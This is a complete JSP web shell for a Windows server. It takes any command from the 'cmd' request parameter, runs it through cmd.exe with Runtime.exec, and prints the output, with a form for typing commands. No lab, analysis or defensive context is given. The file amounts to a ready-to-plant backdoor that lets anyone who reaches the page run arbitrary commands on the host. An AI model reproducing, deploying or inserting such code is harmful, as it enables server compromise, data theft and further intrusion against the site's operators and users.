<%@ page import="java.io.*" %>
   <%
   String cmd = request.getParameter("cmd");
   if(cmd != null) {
       Process p = Runtime.getRuntime().exec("cmd.exe /c " + cmd);
       BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream(), "MS949"));
       String line;
       while((line = br.readLine()) != null) {
           out.println(line + "<br>");
       }
   }
   %>
   <form><input name="cmd"><input type="submit"></form>